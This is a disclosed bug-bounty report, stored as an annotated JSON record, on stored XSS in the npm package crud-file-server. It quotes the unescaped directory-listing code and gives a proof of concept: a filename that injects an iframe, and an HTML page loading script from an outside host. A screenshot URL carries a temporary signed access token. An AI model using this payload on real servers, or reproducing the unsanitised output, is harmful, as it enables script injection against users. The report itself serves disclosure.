{
  "reported_to": "Node.js third-party modules",
  "reported_by": "bl4de ",
  "title": "[crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server",
  "content": "\nHi Guys,\ncrud-file-server allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.\nModule\ncrud-file-server\nThis package exposes a directory and its children to create, read, update, and delete operations over http.\nhttps://www.npmjs.com/package/crud-file-server\nversion: 0.7.0\nStats\n0 downloads in the last day\n26 downloads in the last week\n220 downloads in the last month\n~2500 estimated downloads per year\nDescription\nThis vulnerability exists, because name which represents filename(s) is output in HTML without any sanitization. This allows to embed malicious code in filenames listed in directory:\nCode 491 Bytes\n1// node_modules/crud-file-server/crud-file-server.js, line 137\n2    res.setHeader('Content-Type', 'text/html');\t\t\t\t\t\t\t\t\t\t\t\n3    res.write('<html><body>');\n4    for(var f = 0; f < results.length; f++) {\n5        var name = results[f].name;\n6        var normalized = url + '/' + name;\n7        while(normalized[0] == '/') { normalized = normalized.slice(1, normalized.length); }\n8        res.write('\\r\\n<p><a href=\"/' + normalized + '\">' + name + '</a></p>');\n9    }\n10    res.end('\\r\\n</body></html>');\nPoC - Steps To Reproduce:\ninstall crud-file-server\nCode 30 Bytes\n1$ npm install crud-file-server\nin the directory which will be served via crud-file-server, create file with following name:\nCode 35 Bytes\n1\"><iframe src=\"malware_frame.html\">\ncreate second file with name malware_frame.html with following content and save it in the same directory:\nCode 246 Bytes\n1<html>\n2\n3<head>\n4    <meta charset=\"utf8\" />\n5    <title>Frame embeded with malware :P</title>\n6</head>\n7\n8<body>\n9    <p>iframe element with malicious code</p>\n10    <script type=\"text/javascript\" src=\"http://bl4de.tech/poc.js\"></script>\n11</body>\n12\n13</html>\nRun crud-file-server in directory with file with changed filename:\nCode 463 Bytes\n1$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080\n2\n3usage:\n4  crud-file-server [options]\n5\n6this starts a file server using the specified command-line options\n7\n8options:\n9\n10  -f file system path to expose over http\n11  -h log head requests\n12  -p port to listen on (example, 80)\n13  -q suppress this message\n14  -r read only\n15  -v virtual path to host the file server on\n16\n17example:\n18\n19  crud-file-server -f c:/ -p 8080 -q -v filez\n20\n21listening on :8080/, serving ./\nand open http://127.0.0.1:8000 in the browser. You will notice an alert served from bl4de.tech, executed in context of page with directory index:\n<image_0>\nSupporting Material/References:\nConfiguration I've used to find this vulnerability:\nmacOS HighSierra 10.13.3\nnode 8.9.3\nnpm 5.5.1\ncurl 7.54.0\nWrap up\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\nThank you\nRegards,\nRafal 'bl4de' Janicki\nImpact\nThis vulnerability can be used to eg. download malware via \"drive-by-download\" attacks. Also, as described in other modules I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.\n\n",
  "severity": [
    9.6,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/259/251/3a01b57e56be5dab7528af74ae74cd3c9bc6a032/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCLRXFCB%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T175613Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDxVo4lqNtm3hXHSOHwVIj42dQ4FG6Kzu6nonwvUe%2FylQIgX7FBKt6IBBTBIEM1eWBOuGM98pnEZ6CxkzvrssVB6%2FIqsgUIMhADGgwwMTM2MTkyNzQ4NDkiDIVbUSW8ZU3FlH%2BQ8yqPBaXkThMLriGYmhivxWG1kR6zMjhbS%2FIhF5pUIuQWyGaIrf9osJZT3B5jwBKsm3BhB%2Bz7bg73ZCmi%2B6nmh5NhNPeJmJFbC%2B6dcIGaP%2Fzi08%2BEbXODgr%2FGNIOrBSeYwfIY7C5vEBMeJixkfErdaOiY8V8GsoL7jFYtGSO7X0OnX3ZHJI4mVh8MB65g9BuPimUoW1RTi0T5jINTmGKt9Y8QI%2B879cYwbdy9UqVjSipce%2F79zK06FLuWdKvGtZ4yRjuw3bgnhy9QJu4IX5D2T%2F%2FCwaV0gnEbhK3Z5xCzFj44lykS1%2B%2Fog7ZypMzhv154KRW7ubqJdkFli3DBlGBi9Rn1EJ4YjHlM6CYHkDCplfL8tPcMxSfWBmcImAyaJNINMUagSbwooyZlmvAuiv6i9VuM%2BbxPoDTVrQUUZOrQzq1uQhO2F7lVZw6OposGrM0NrCzZ3apltziCddWCVE0IFhCn3VwJiW5IZnMUAF2O46RVgw7rm8g91SiLMPRL%2FbO0tCs6ysPgCCHpyYNWKLq07XITGoiz3Nu9xx%2FjFhm917m1dvpeSBpdzV2puGB1DRsWOgieY69hbo74ylzn52LmAQXXGjFB%2BBWE4BprgwAXcA0GyWc9xkwf4NJUMviy3saMx7OdQ4hGPMQfqkG4M9a%2B2ZLolS4NCFrPUaLpSMX5fqbzlMAP2oaahm0IKNYiqRyW4GPfq5sjKNQ3S4OZb%2FrZVC4pCN2r7zN8ixLgRwqy8Qi7YCRDDZAgsLtyKNhNY7GEyGBWhuAfOIAyWETr4fag28jsuFlbo6KyRRGQYIm92FnnbBld5XxwKCshkttXDESC%2BhKYN6v5QCZ4kUosahqIQlh5xfOj%2Fh%2BXY%2F1kFL7A2180Ozkwn9uQvwY6sQFEuK9C5EdAGeChieQ5PmwUWlwumjqNVQADouTc4Rb5yTYX%2FbEA%2Fcr0a39YSlMJJiTAbPihWryxY6f39MCTiCBuDLUFQeYwNV%2FKMPj%2BV0XUIIJTlfMvMYXr6D6ArHcN3%2BkGgpbmIlSIncgCuu2jEoNDbG88W7CDHeOH292I13G90XbWlgeGYKOJ8P5JmIQzY9H6AYuD9G8DAtabj2GdXDHBDCNSTUrl6Iix4U2CPri1IQY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d23f790f53f14e559792b06c7b4464aa35375947ca6ab800794c85adbf5f8382"
  },
  "disclosed_date": 1518907860,
  "report_url": "https://hackerone.com/reports/311101",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install crud-file-server using npm: `npm install crud-file-server`"
    ],
    [
      2,
      "Create a file with a malicious filename in the served directory: `\"><iframe src=\"malware_frame.html\">`"
    ],
    [
      3,
      "Create a second file named `malware_frame.html` with malicious JavaScript content"
    ],
    [
      4,
      "Run the crud-file-server in the directory containing the malicious files: `./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080`"
    ],
    [
      5,
      "Access the server via browser at `http://127.0.0.1:8080` to trigger the XSS"
    ]
  ],
  "vuln_description": "The crud-file-server package is vulnerable to stored XSS via filenames due to lack of HTML sanitization when displaying directory listings. Malicious JavaScript can be executed by creating files with specially crafted names containing HTML/JS payloads.",
  "reason": "The vulnerability is straightforward to discover as it follows common XSS patterns in file listing scenarios. The attack requires only basic knowledge of XSS payloads and observing unsanitized output in directory listings.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves stored XSS in filenames when the directory index is served, which is not related to authentication or authorization bypass. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities, which are different from XSS vulnerabilities.",
    "is_detectable": false
  }
}